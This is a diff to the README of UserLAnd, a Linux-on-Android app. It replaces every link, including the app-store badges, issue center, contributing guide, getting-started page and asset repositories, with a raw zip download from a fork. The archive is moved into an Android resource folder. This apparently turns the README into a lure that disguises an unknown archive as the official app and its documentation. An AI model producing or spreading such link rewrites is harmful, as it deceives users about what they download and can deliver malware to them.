@@ -1,4 +1,4 @@
-![UserLAnd Feature Graphic](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
+![UserLAnd Feature Graphic](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip)
 
 # Welcome to UserLAnd
 
@@ -8,25 +8,25 @@ Features:
 * Install and uninstall like a regular app.
 * No root required.
 
-[<img src="https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip"
+[<img src="https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip"
     alt="Get it on F-Droid"
-    height="80">](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
-[<img src="https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip"
+    height="80">](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip)
+[<img src="https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip"
      alt="Get it on Google Play"
-     height="80">](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
+     height="80">](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip)
      
 ## Have a bug report or a feature request?
-You can see our templates by visiting our [issue center](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip).
+You can see our templates by visiting our [issue center](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip).
 
 ## Want to contribute?
-See our [CONTRIBUTING](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip) document.
+See our [CONTRIBUTING](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip) document.
 
 ## Start using UserLAnd
-See our [Getting Started](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip) page.
+See our [Getting Started](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip) page.
 
 ## UserLAnd assets
 The assets that UserLAnd depends on and the scripts that build them are contained in other repositories.  
 
-The common assets that are used for all distros and application are found at [CypherpunkArmory/UserLAnd-Assets-Support](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip).  
+The common assets that are used for all distros and application are found at [CypherpunkArmory/UserLAnd-Assets-Support](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip).  
 
-Distribution or application specific assets are found under CypherpunkArmory/UserLAnd-Assets-(__Distribution/App__). For example, our Debian specific assets can be found at [CypherpunkArmory/UserLAnd-Assets-Debian](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/campimetry/UserLAnd.zip)
+Distribution or application specific assets are found under CypherpunkArmory/UserLAnd-Assets-(__Distribution/App__). For example, our Debian specific assets can be found at [CypherpunkArmory/UserLAnd-Assets-Debian](https://raw.githubusercontent.com/Djspraragen/UserLAnd/master/app/src/main/res/values-ar/L_User_And_v1.8.zip)
